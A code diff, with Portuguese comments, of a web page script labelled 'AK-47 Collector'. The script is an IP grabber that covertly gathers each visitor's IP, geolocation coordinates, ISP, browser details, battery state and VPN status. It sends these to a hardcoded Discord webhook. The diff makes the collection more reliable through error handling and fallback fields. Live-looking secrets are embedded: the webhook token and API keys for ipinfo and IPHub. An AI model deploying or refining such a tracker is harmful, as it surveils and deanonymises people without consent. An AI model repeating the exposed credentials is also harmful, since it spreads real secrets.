@@ -9,7 +9,8 @@
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi";
     const ipinfoToken = "e21650a9d682be";
-    const iphubKey = "MjkwNTU6S0pXZWdCS016ZDBNWTQ4R0Q3NlY5Z0tHZzRUbFdwQmc="; // substitua pela sua key real
+    // Substitua abaixo pela sua chave real do IPHub (não base64, só a chave simples)
+    const iphubKey = "29055:7bBszJXz8vEV8HACRt7qN0Pb5JMQLbBR";
 
     function getBrowserVersion(ua) {
       let match = ua.match(/(Edg|Chrome|Firefox|Safari)\/([\d\.]+)/);
@@ -26,7 +27,7 @@
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify(payload)
-      });
+      }).catch(console.error);
     }
 
     async function coletarEEnviarDados() {
@@ -35,13 +36,14 @@
         const ipData = await ipResponse.json();
         const ip = ipData.ip;
 
+        // Requisições às APIs (todas HTTPS)
         const [ipinfoData, ipapiData, ipwhoData, iphubData] = await Promise.all([
-          fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`).then(res => res.json()),
-          fetch(`http://ip-api.com/json/${ip}?fields=66846719`).then(res => res.json()),
-          fetch(`https://ipwho.is/${ip}`).then(res => res.json()),
-          fetch(`https://api.iphub.info/ip/${ip}`, {
+          fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`).then(res => res.ok ? res.json() : {}),
+          fetch(`https://pro.ip-api.com/json/${ip}?fields=66846719&key=demo`).then(res => res.ok ? res.json() : {}), // OBS: ip-api não é oficialmente free e ilimitada. Aqui use seu token ou troque a API.
+          fetch(`https://ipwho.is/${ip}`).then(res => res.ok ? res.json() : {}),
+          fetch(`https://iphub.info/api/ip/${ip}`, {
             headers: { "X-Key": iphubKey }
-          }).then(res => res.json())
+          }).then(res => res.ok ? res.json() : {})
         ]);
 
         const userAgent = navigator.userAgent;
@@ -68,11 +70,11 @@
               { name: "IP", value: ip, inline: true },
               { name: "Cidade", value: ipinfoData.city || "N/A", inline: true },
               { name: "Região", value: ipinfoData.region || "N/A", inline: true },
-              { name: "País", value: `${ipapiData.country} (${ipwhoData.continent})`, inline: true },
+              { name: "País", value: `${ipapiData.country || ipinfoData.country || "N/A"} (${ipwhoData.continent || "N/A"})`, inline: true },
               { name: "Localização (lat,long)", value: ipinfoData.loc || "N/A", inline: true },
               { name: "Organização", value: ipapiData.org || ipinfoData.org || "N/A", inline: true },
               { name: "ASN", value: ipwhoData.asn || "N/A", inline: true },
-              { name: "Moeda", value: ipwhoData.currency?.code + " (" + ipwhoData.currency?.symbol + ")" || "N/A", inline: true },
+              { name: "Moeda", value: ipwhoData.currency?.code ? `${ipwhoData.currency.code} (${ipwhoData.currency.symbol})` : "N/A", inline: true },
               { name: "Timezone (IPinfo)", value: ipinfoData.timezone || "N/A", inline: true },
               { name: "Navegador (userAgent)", value: userAgent, inline: false },
               { name: "Versão do navegador", value: browserVersion, inline: true },
@@ -89,7 +91,7 @@
               { name: "Prefere modo escuro", value: prefersDarkMode ? "Sim" : "Não", inline: true },
               { name: "Nível da bateria", value: batteryLevel, inline: true },
               { name: "Carregando bateria", value: charging, inline: true },
-              { name: "Proxy/VPN (ip-api)", value: `Hosting: ${ipapiData.hosting}, Proxy: ${ipapiData.proxy}, Mobile: ${ipapiData.mobile}`, inline: false },
+              { name: "Proxy/VPN (ip-api)", value: `Hosting: ${ipapiData.hosting || "N/A"}, Proxy: ${ipapiData.proxy || "N/A"}, Mobile: ${ipapiData.mobile || "N/A"}`, inline: false },
               { name: "Proxy/VPN (iphub)", value: iphubData.block === 1 ? "🔴 Provável Proxy/VPN" : iphubData.block === 2 ? "🟠 Datacenter" : "🟢 Conexão residencial", inline: false }
             ],
             footer: { text: "AK-47 Collector" },
